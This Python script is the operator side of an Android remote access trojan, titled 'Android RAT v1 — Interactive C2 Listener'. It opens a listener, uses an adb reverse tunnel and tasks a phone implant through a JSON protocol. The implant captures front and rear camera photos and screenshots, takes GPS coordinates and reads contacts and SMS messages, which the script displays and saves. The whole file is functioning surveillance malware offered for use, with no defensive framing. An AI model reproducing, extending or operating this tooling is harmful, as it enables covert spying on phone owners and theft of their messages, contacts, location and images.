#!/usr/bin/env python3
"""
Android RAT v1 — Interactive C2 Listener

Usage:
    python c2.py                  # ADB tunnel (device on USB)
    python c2.py --port 8667      # custom port
"""
import os, sys, json, socket, struct, time, subprocess, base64, uuid, argparse
from pathlib import Path
from datetime import datetime

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

OUT = Path(__file__).parent / "c2_output"
os.makedirs(OUT, exist_ok=True)

R="\033[91m"; G="\033[92m"; A="\033[93m"; W="\033[97m"; D="\033[90m"; X="\033[0m"

# ── protocol ──────────────────────────────────────────────────────────────────

def send_msg(sock, data):
    raw = json.dumps(data).encode()
    sock.sendall(struct.pack(">I", len(raw)) + raw)

def recv_msg(sock, timeout=60):
    sock.settimeout(timeout)
    try:
        hdr = b""
        while len(hdr) < 4:
            c = sock.recv(4 - len(hdr))
            if not c: return None
            hdr += c
        n = struct.unpack(">I", hdr)[0]
        if n > 50*1024*1024: return None
        body = b""
        while len(body) < n:
            c = sock.recv(min(65536, n - len(body)))
            if not c: return None
            body += c
        return json.loads(body.decode())
    except socket.timeout:
        return None
    finally:
        sock.settimeout(None)

def dispatch(sock, op, timeout=60, **kwargs):
    tid = uuid.uuid4().hex[:6]
    send_msg(sock, {"type": "task", "task_id": tid, "op": op, **kwargs})
    print(f"  {A}>> {op}{X} (waiting up to {timeout}s...)")
    deadline = time.time() + timeout
    while time.time() < deadline:
        remaining = max(2, deadline - time.time())
        msg = recv_msg(sock, timeout=remaining)
        if msg is None:
            print(f"  {R}timeout{X}")
            return None
        if msg.get("task_id") == tid:
            return msg.get("data", {})
    return None

def save(data, prefix):
    b64 = data.get("data") or data.get("image")
    if not b64:
        return None
    ts = datetime.now().strftime("%H%M%S")
    ext = "jpg" if prefix in ("camera","screenshot") else "bin"
    p = OUT / f"{prefix}_{ts}.{ext}"
    p.write_bytes(base64.b64decode(b64))
    return p

# ── commands ──────────────────────────────────────────────────────────────────

CMDS = {
    "s":  ("sysinfo",    "device info"),
    "c":  ("camera",     "front camera shot"),
    "cb": ("camera",     "back camera shot",   {"facing": "rear"}),
    "g":  ("gps",        "GPS location"),
    "x":  ("contacts",   "read contacts"),
    "m":  ("sms_read",   "read SMS"),
    "sc": ("screenshot", "screenshot"),
    "a":  ("acc_status", "accessibility status"),
}

def print_menu():
    print(f"\n  {W}── ops ─────────────────{X}")
    for k, v in CMDS.items():
        print(f"  {G}{k:4}{X} {v[1]}")
    print(f"  {G}q   {X} quit")
    print(f"  {W}────────────────────────{X}")

def run_cmd(sock, key):
    entry = CMDS.get(key)
    if not entry:
        print(f"  {R}unknown command{X}")
        return
    op = entry[0]
    label = entry[1]
    extra = entry[2] if len(entry) > 2 else {}

    timeout = 40 if op in ("gps",) else 30
    result = dispatch(sock, op, timeout=timeout, **extra)

    if result is None:
        print(f"  {R}no response{X}")
        return

    err = result.get("error")
    if err:
        print(f"  {R}error:{X} {err}")
        return

    # pretty print
    if op == "sysinfo":
        for k, v in result.items():
            print(f"  {D}{k}:{X} {v}")

    elif op in ("camera", "screenshot"):
        p = save(result, op)
        if p:
            size = p.stat().st_size // 1024
            print(f"  {G}saved:{X} {p.name} ({size}KB)")
            print(f"  {D}path:{X} {p}")
        else:
            print(f"  {R}no image data{X}")

    elif op == "gps":
        lat = result.get("latitude", "?")
        lon = result.get("longitude", "?")
        acc = result.get("accuracy", "?")
        print(f"  {G}GPS:{X} {lat}, {lon}  accuracy={acc}m")
        print(f"  {D}maps: https://maps.google.com/?q={lat},{lon}{X}")

    elif op == "contacts":
        contacts = result.get("contacts", [])
        print(f"  {G}{len(contacts)} contacts{X}")
        for c in contacts[:10]:
            print(f"  {D}{c.get('name','?'):30} {c.get('phone','')}{X}")
        if len(contacts) > 10:
            print(f"  {D}... and {len(contacts)-10} more{X}")

    elif op == "sms_read":
        msgs = result.get("messages", [])
        print(f"  {G}{len(msgs)} messages{X}")
        for m in msgs[:10]:
            addr = m.get("address","?")
            body = m.get("body","")[:60]
            print(f"  {D}{addr:20} {body}{X}")
        if len(msgs) > 10:
            print(f"  {D}... and {len(msgs)-10} more{X}")

    elif op == "acc_status":
        print(f"  {G}acc_available:{X} {result.get('acc_available')}")
        print(f"  {G}screen_grant:{X}  {result.get('screen_grant')}")

    else:
        print(f"  {D}{json.dumps(result, indent=2)[:500]}{X}")

# ── main ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=18667)
    ap.add_argument("--no-adb", action="store_true", help="skip adb reverse setup")
    args = ap.parse_args()

    if not args.no_adb:
        print(f"  {A}setting up adb reverse tcp:8667 -> {args.port}{X}")
        subprocess.run(f"adb reverse tcp:8667 tcp:{args.port}", shell=True,
                       capture_output=True)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port))
    srv.listen(1)
    print(f"\n  {G}RATV1 C2{X} listening on :{args.port}")
    print(f"  {D}output dir: {OUT}{X}")
    print(f"  {A}waiting for agent...{X}")

    srv.settimeout(120)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print(f"  {R}no agent connected after 120s{X}")
        return

    # read registration
    msg = recv_msg(conn, timeout=10)
    if msg:
        model = msg.get("model", "?")
        host  = msg.get("hostname", "?")
        print(f"  {G}agent connected:{X} {host} ({model})")

    print_menu()

    while True:
        try:
            key = input(f"\n  {W}cmd>{X} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break
        if key == "q":
            break
        if key == "?":
            print_menu()
            continue
        if not key:
            continue
        try:
            run_cmd(conn, key)
        except (BrokenPipeError, ConnectionResetError):
            print(f"  {R}agent disconnected{X}")
            break

    conn.close()
    srv.close()
    print(f"\n  {D}session ended. output: {OUT}{X}")

if __name__ == "__main__":
    main()
